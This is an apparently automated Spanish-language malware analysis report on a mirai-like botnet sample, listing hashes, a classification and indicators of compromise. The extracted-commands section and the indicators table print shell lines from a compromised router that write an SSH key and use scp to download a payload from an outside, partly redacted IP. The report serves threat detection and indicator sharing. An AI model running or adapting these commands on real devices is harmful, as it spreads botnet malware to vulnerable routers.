# 🧬 Payload Analysis

`dedc6cc194b2bbb6fadae66ad44e029f13c489bda18247e928fc87f400a85208`

## 📌 Resumen

Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Cambio de permisos. Se identificaron 3 comandos observados o extraídos. Se identificaron 7 indicadores técnicos.


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai-like`
- **Confianza de familia:** `Media`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:36:13.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `dedc6cc194b2bbb6fadae66ad44e029f13c489bda18247e928fc87f400a85208`
- **MD5:** `e0c7653eafbb4388ce23f229181dd5c1`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | data |
| Tamaño | 2.3 KiB |
| Entropía | 5.93 |
| Strings | 40 |

## 🧠 Comportamiento observado

1. **Cambio de permisos**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=data; iocs=7

## 🖥️ Comandos observados / extraídos

```text
sshd:x:22:22:sshd:/var/empty:/bin/false
[4lroot@TL-WR841N:~# cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----
root@TL-WR841N:~# UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.XXX
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://217.60.195.XXX/sh) | strings |
| url | hxxps://217.60.195.XXX/sh | strings |
| ip | 217.60.195.XXX | static_analysis |
| command | sshd:x:22:22:sshd:/var/empty:/bin/false | strings |
| command | [4lroot@TL-WR841N:~# cd /tmp \|\| cd /var/tmp \|\| cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY----- | strings |
| command | root@TL-WR841N:~# UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.XXX | strings |
| hash | dedc6cc194b2bbb6fadae66ad44e029f13c489bda18247e928fc87f400a85208 | static_analysis |
| ip | [internal-ip-redacted] | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
